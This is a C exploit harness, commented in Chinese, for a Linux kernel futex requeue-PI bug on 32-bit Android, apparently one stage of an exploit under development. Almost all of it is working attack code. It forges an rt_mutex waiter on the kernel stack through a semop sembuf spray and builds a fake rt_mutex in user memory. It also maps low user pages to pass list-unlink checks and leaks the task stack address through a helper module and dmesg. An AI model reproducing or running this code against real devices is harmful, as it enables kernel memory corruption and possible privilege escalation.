/* CVE-2026-43499 / GhostLock —— 两阶段 harness（P4.44）
 *
 * 与 P4.43 的关键差别：**先泄漏 stack，再调 semop**
 *
 *   P4.43: A 先 semop 阻塞，再泄漏 → sops 已经进内核栈，prio_list.next 只能填
 *          事先知道的常数 ⇒ 装不下栈地址 ⇒ prio_list 非空 ⇒ 必须走重排分支
 *          ⇒ 而 prio_list.prev 被 sem_num=0 钉成 64KB 对齐，落在 text 段上，
 *          实测 oops（__list_del_entry+0x38，r3=prev=0）。
 *
 *   P4.44: A 的 futex 返回后先等主线程泄漏 stack，拿到 waiter 绝对地址，
 *          再用它填 sops ⇒
 *            prio_list.next = &waiter->prio_list（栈地址）
 *            ⇒ list_empty(&node->prio_list) 为真
 *            ⇒ plist_del 直接跳过重排分支，只做 list_del(&node->node_list)
 *          ⇒ 只剩 node_list 两个字段：prev（32 位自由）、next（0x0000XXXX）
 *          ⇒ 用户页只需 0x8000..0xFFFF（32KB，mmap_min_addr 之上，不碰 text）
 *
 * 几何（实测，P4.38/P4.41）：
 *   waiter            = task->stack + 0x1DF8
 *   semop fast_sops   = task->stack + 0x1DE8   （32×6，覆盖 waiter−0x10..+0xAF）
 *   waiter 字段 ↔ sembuf（6 字节 / 项，数组基址 = waiter − 0x10）：
 *     +0x00 prio           = ops[2].sem_flg | ops[3].sem_num<<16
 *     +0x04 prio_list.next = ops[3].sem_op  | ops[3].sem_flg<<16   ← 32 位全可控
 *     +0x08 prio_list.prev = ops[4].sem_num(0) | ops[4].sem_op<<16
 *     +0x0C node_list.next = ops[4].sem_flg | ops[5].sem_num(0)<<16 ← 0x0000XXXX
 *     +0x10 node_list.prev = ops[5].sem_op  | ops[5].sem_flg<<16   ← 32 位全可控
 *     +0x28 task           = ops[9].sem_op  | ops[9].sem_flg<<16
 *     +0x2C lock           = ops[10].sem_num(0) | ops[10].sem_op<<16 ← 低16位恒0
 *
 * 假 rt_mutex（fake_lock，64KB 对齐）：
 *   +0x00 wait_lock   +0x08 wait_list.node_list（自环）+0x10 owner
 *   +0x28 空表时 rt_mutex_top_waiter() 算出的 w->lock 位置
 *        （plist_first = (fake+0x08)-0x0C = fake-0x04，w->lock = fake+0x28）
 *
 * 判据：T 触发后 fake+0x08/0x0C 变成 0xcXXXXXXX ⇒ plist_add 真的跑了
 *
 * 用法：/data/local/tmp/ktool root /data/local/tmp/sem_ghost [--stack=0xXXXXXXXX]
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/types.h>
#include <time.h>
#include <errno.h>
#include <stdint.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sched.h>

#ifndef SYS_syslog
#define SYS_syslog 103
#endif
#define SYSLOG_ACTION_READ_ALL	3

#define FUTEX_WAIT_REQUEUE_PI	11
#define FUTEX_CMP_REQUEUE_PI	12
#define FUTEX_LOCK_PI		6

#define INIT_TASK	0xc0b79be0u
#define SEMOPS		32

/* 用户页：0x8000..0xFFFF。text 从 0x10000 开始，必须避开。
 * 0 页（mmap_min_addr）实测被拒（EINVAL，即使 full caps），不可用。 */
#define U_BASE		0x00008000u
#define U_LEN		0x00008000u
#define U_NODE_PREV	0x00009000u	/* node_list.prev 指向这里（32 位自由） */
#define U_NODE_NEXT	0x0000A000u	/* node_list.next 指向这里（0x0000XXXX） */

#define W_STACK_OFF	0x1DF8u		/* waiter 相对 task->stack */
#define W_PRIO_LIST	0x04u
#define W_NODE_LIST	0x0Cu

static uint32_t u1, u2, u3, u4;

static volatile int a_started, b_locked_u2, t_done;
static volatile int a_tid;
static volatile int a_ret = 999, a_err, b_ret = 999;
static volatile int t_ret = 999, t_err, sem_ret = 999, sem_err;
static volatile int c_ret = 999, c_err;

static void *fake_lock;
static int g_semid = -1;
static int g_sig[2];		/* A -> main：futex 已返回 */
static int g_ack[2];		/* main -> A：waiter 地址已就绪 */
static struct sembuf sops[SEMOPS];
static FILE *lg;

static uint32_t g_stack;
static uint32_t g_waiter;	/* = stack + 0x1DF8 */
static uint32_t g_entry_node;	/* = waiter + 0x0C */
static char *g_kbuf;

static void logf_(const char *fmt, ...)
{
	va_list ap;
	char buf[512];
	int n;

	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof buf, fmt, ap);
	va_end(ap);
	if (lg) {
		fwrite(buf, 1, n, lg);
		fflush(lg);
		fsync(fileno(lg));
	}
	write(1, buf, n);
}

static int futex(uint32_t *u, int op, uint32_t val, const struct timespec *to,
		 uint32_t *u2p, uint32_t val3)
{
	return syscall(SYS_futex, u, op, val, to, u2p, val3);
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;

	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof s, &s);
}

static int map_user_pages(void)
{
	void *p = mmap((void *)(uintptr_t)U_BASE, U_LEN,
		       PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

	if (p == MAP_FAILED) {
		logf_("[!] mmap(%#x,%#x) failed errno=%d\n", U_BASE, U_LEN, errno);
		return -1;
	}
	if ((uintptr_t)p != U_BASE) {
		logf_("[!] mmap got %p, want %#x\n", p, U_BASE);
		return -1;
	}
	memset(p, 0, U_LEN);
	return 0;
}

/* node_list 的两个检查：prev->next == entry 且 next->prev == entry */
static void fill_user(uint32_t entry_node)
{
	*(uint32_t *)(uintptr_t)(U_NODE_PREV + 0) = entry_node;		/* 0x9000 */
	*(uint32_t *)(uintptr_t)(U_NODE_NEXT + 4) = entry_node;		/* 0xA004 */
	__sync_synchronize();
}

/* 假 rt_mutex */
static void build_fake(void)
{
	unsigned char *p = (unsigned char *)fake_lock;

	memset(p, 0, 0x200);
	*(uint32_t *)(p + 0x00) = 0;			/* wait_lock 未锁 */
	*(uint32_t *)(p + 0x04) = 0;			/* break_lock */
	*(uint32_t *)(p + 0x08) = (uint32_t)(uintptr_t)(p + 0x08); /* 自环 */
	*(uint32_t *)(p + 0x0C) = (uint32_t)(uintptr_t)(p + 0x08);
	*(uint32_t *)(p + 0x10) = 0;			/* owner = NULL */
	*(uint32_t *)(p + 0x28) = (uint32_t)(uintptr_t)p;	/* 空表的 w->lock */
	__sync_synchronize();
}

/* 用已知的 waiter 绝对地址填 sembuf */
static void build_sops(uint32_t waiter)
{
	int i;

	memset(sops, 0, sizeof sops);
	for (i = 0; i < SEMOPS; i++)
		sops[i].sem_num = 0;	/* 必须：内核阻塞前校验所有 sem_num */
	sops[0].sem_op = -1;		/* sem 值 0 -> 阻塞 */

	/* prio：必须 != task->prio，否则提前 goto out_unlock_pi */
	sops[2].sem_flg = (short)0x7fff;

	/* prio_list.next = waiter+0x04 → 让 list_empty() 为真，
	 * plist_del 整个重排分支被跳过（32 位全可控） */
	{
		uint32_t pl = waiter + W_PRIO_LIST;

		sops[3].sem_op  = (short)(pl & 0xffff);
		sops[3].sem_flg = (short)((pl >> 16) & 0xffff);
	}
	/* prio_list.prev 不会被读，留 0 即可（只能是 0xXXXX0000） */

	/* node_list.next = U_NODE_NEXT（只能编码 0x0000XXXX） */
	sops[4].sem_flg = (short)(U_NODE_NEXT & 0xffff);

	/* node_list.prev = U_NODE_PREV（32 位全可控） */
	sops[5].sem_op  = (short)(U_NODE_PREV & 0xffff);
	sops[5].sem_flg = (short)((U_NODE_PREV >> 16) & 0xffff);

	/* task = INIT_TASK（idle，wake_up_process 无害） */
	sops[9].sem_op  = (short)(INIT_TASK & 0xffff);
	sops[9].sem_flg = (short)((INIT_TASK >> 16) & 0xffff);

	/* lock = fake_lock（低 16 位被 sem_num=0 钉死 ⇒ 64KB 对齐） */
	sops[10].sem_op = (short)(((uintptr_t)fake_lock >> 16) & 0xffff);
}

static int stack_from_dmesg(uint32_t *stack)
{
	long n;
	char *p, *last = NULL;
	const char *key = "ktool:   task->stack=";

	if (!g_kbuf)
		return -1;
	n = syscall(SYS_syslog, SYSLOG_ACTION_READ_ALL, g_kbuf, (1 << 20) - 1);
	if (n <= 0) {
		logf_("[!] syslog(READ_ALL) -> %ld errno=%d\n", n, errno);
		return -1;
	}
	g_kbuf[n] = 0;
	p = g_kbuf;
	while ((p = strstr(p, key)) != NULL) {
		last = p;
		p++;
	}
	if (!last) {
		logf_("[!] dmesg 里没有 task->stack\n");
		return -1;
	}
	last += strlen(key);
	if (sscanf(last, "%x", stack) != 1)
		return -1;
	return 0;
}

static int ask_module_for_stack(uint32_t tid, uint32_t *stack)
{
	char cmd[64];
	int fd, n, w;

	fd = open("/dev/ktool", O_WRONLY);
	if (fd < 0) {
		logf_("[!] open /dev/ktool: errno=%d（需要 uid0）\n", errno);
		return -1;
	}
	n = snprintf(cmd, sizeof cmd, "waiter %u", tid);
	w = (int)write(fd, cmd, n);
	close(fd);
	if (w != n) {
		logf_("[!] write /dev/ktool -> %d/%d errno=%d\n", w, n, errno);
		return -1;
	}
	usleep(60000);
	return stack_from_dmesg(stack);
}

/* A：持 u4/u3 -> WAIT_REQUEUE_PI(u1->u2) -> 返回后等 main 泄漏 -> semop 阻塞 */
static void *thread_a(void *arg)
{
	struct timespec ts;
	int r;
	char c = 'x';

	(void)arg;
	pin_cpu(0);
	a_tid = syscall(SYS_gettid);

	futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	a_started = 1;
	__sync_synchronize();

	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_sec += 2;
	ts.tv_nsec += 300 * 1000 * 1000;
	while (ts.tv_nsec >= 1000000000) {
		ts.tv_sec++;
		ts.tv_nsec -= 1000000000;
	}

	r = futex(&u1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &u2, 0);
	a_ret = r;
	a_err = errno;

	/* futex 已返回：此时 pi_blocked_on 仍悬空（bug），main 可以泄漏 stack。
	 * 注意这里还没喷栈 —— waiter 区稍后由 semop 覆盖。 */
	write(g_sig[1], &c, 1);

	if (read(g_ack[0], &c, 1) != 1) {
		logf_("[A] ack read fail errno=%d\n", errno);
		return NULL;
	}

	build_sops(g_waiter);
	sem_ret = (int)syscall(SYS_semop, g_semid, sops, SEMOPS);
	sem_err = errno;

	for (;;)
		__sync_synchronize();
	return NULL;
}

/* B：持 u2，然后阻塞在 u3（A 持有）——制造 EDEADLK 路径 */
static void *thread_b(void *arg)
{
	(void)arg;
	pin_cpu(1);
	nice(19);
	futex(&u2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	b_locked_u2 = 1;
	__sync_synchronize();
	b_ret = futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	return NULL;
}

/* T：锁 u4（A 持有）-> 触发链走读 A->pi_blocked_on */
static void *thread_t(void *arg)
{
	(void)arg;
	pin_cpu(2);
	t_ret = futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	t_err = errno;
	t_done = 1;
	__sync_synchronize();
	return NULL;
}

int main(int argc, char **argv)
{
	char c;
	pthread_t ta, tb, tt;
	unsigned char *fk;
	int i, manual = 0;

	setvbuf(stdout, NULL, _IONBF, 0);
	lg = fopen("/data/local/tmp/sg.log", "w");

	for (i = 1; i < argc; i++) {
		if (!strncmp(argv[i], "--stack=0x", 10)) {
			g_stack = (uint32_t)strtoul(argv[i] + 10, NULL, 16);
			manual = 1;
		}
	}

	if (pipe(g_sig) != 0 || pipe(g_ack) != 0) {
		logf_("[!] pipe fail\n");
		return 1;
	}
	g_kbuf = malloc(1 << 20);
	if (!g_kbuf) {
		logf_("[!] malloc fail\n");
		return 1;
	}
	if (map_user_pages() != 0)
		return 1;

	g_semid = semget(IPC_PRIVATE, 1, 0666 | IPC_CREAT);
	if (g_semid < 0) {
		logf_("[!] semget errno=%d\n", errno);
		return 1;
	}
	semctl(g_semid, 0, SETVAL, 0);

	{
		void *pg = mmap(NULL, 0x20000, PROT_READ | PROT_WRITE,
				MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

		if (pg == MAP_FAILED) {
			logf_("[!] mmap fake fail\n");
			return 1;
		}
		fake_lock = (void *)(((uintptr_t)pg + 0xFFFFULL) & ~0xFFFFULL);
	}
	build_fake();

	logf_("=== sem_ghost(P4.44) pid=%d semid=%d ===\n", getpid(), g_semid);
	logf_("fake_lock=%p (64K aligned=%d)\n", fake_lock,
	      ((uintptr_t)fake_lock & 0xFFFF) == 0);
	logf_("user page %#x..%#x: node_prev=%#x node_next=%#x\n",
	      U_BASE, U_BASE + U_LEN - 1, U_NODE_PREV, U_NODE_NEXT);

	pthread_create(&ta, NULL, thread_a, NULL);
	while (!a_started)
		usleep(1000);
	usleep(150000);

	pthread_create(&tb, NULL, thread_b, NULL);
	while (!b_locked_u2)
		usleep(1000);
	usleep(250000);

	c_ret = futex(&u1, FUTEX_CMP_REQUEUE_PI, 1, NULL, &u2, 0);
	c_err = errno;
	logf_("[C] CMP_REQUEUE_PI=%d errno=%d %s\n", c_ret, c_err,
	      (c_ret < 0 && c_err == 35) ? "*** EDEADLK (bug fired) ***" : "(?)");

	if (read(g_sig[0], &c, 1) != 1) {
		logf_("[!] sig read fail\n");
		return 1;
	}
	usleep(120000);		/* 让 A 走到 read(ack) 并睡下 */

	logf_("[A] futex=%d/%d tid=%d\n", a_ret, a_err, (int)a_tid);

	/* ---- 阶段 2：泄漏 stack（此时 A 还没喷栈，waiter 区随便覆盖） ---- */
	if (!manual) {
		if (ask_module_for_stack((uint32_t)a_tid, &g_stack) != 0) {
			logf_("[!] 取 stack 失败；可 --stack=0x<stack> 手工重跑\n");
			logf_("*** RESULT: ABORT (no stack) ***\n");
			return 2;
		}
	}
	g_waiter = g_stack + W_STACK_OFF;
	g_entry_node = g_waiter + W_NODE_LIST;
	fill_user(g_entry_node);

	logf_("[L] stack=%#x waiter=%#x prio_list=%#x entry_node=%#x\n",
	      g_stack, g_waiter, g_waiter + W_PRIO_LIST, g_entry_node);
	logf_("[L] user page: [%#x]=%#x [%#x]=%#x\n",
	      U_NODE_PREV, *(uint32_t *)(uintptr_t)U_NODE_PREV,
	      U_NODE_NEXT + 4, *(uint32_t *)(uintptr_t)(U_NODE_NEXT + 4));

	/* 放 A 去做 semop */
	write(g_ack[1], "y", 1);
	usleep(300000);		/* 等 semop 落进 fast_sops 并阻塞 */

	fk = (unsigned char *)fake_lock;
	logf_("[T] before: wait_list.next=%08x prev=%08x\n",
	      *(uint32_t *)(fk + 0x08), *(uint32_t *)(fk + 0x0C));

	pthread_create(&tt, NULL, thread_t, NULL);
	for (i = 0; i < 60 && !t_done; i++)
		usleep(50000);

	logf_("[T] done=%d ret=%d err=%d\n", t_done, t_ret, t_err);
	logf_("[T] after : wait_list.next=%08x prev=%08x owner=%08x\n",
	      *(uint32_t *)(fk + 0x08), *(uint32_t *)(fk + 0x0C),
	      *(uint32_t *)(fk + 0x10));

	{
		uint32_t nx = *(uint32_t *)(fk + 0x08);

		/* 内核态线性映射区 0xc0000000..0xefffffff（本机栈实测 e3xxxxxx） */
		if (nx == g_entry_node)
			logf_("*** RESULT: plist_add 执行了，wait_list.next == entry_node(%08x) ***\n",
			      nx);
		else if (nx >= 0xc0000000u && nx < 0xf0000000u)
			logf_("*** RESULT: wait_list 里是内核指针 %08x（plist_add 执行）***\n",
			      nx);
		else
			logf_("*** RESULT: wait_list 未被改写 (%08x) ***\n", nx);
	}
	sleep(1);
	return 0;
}
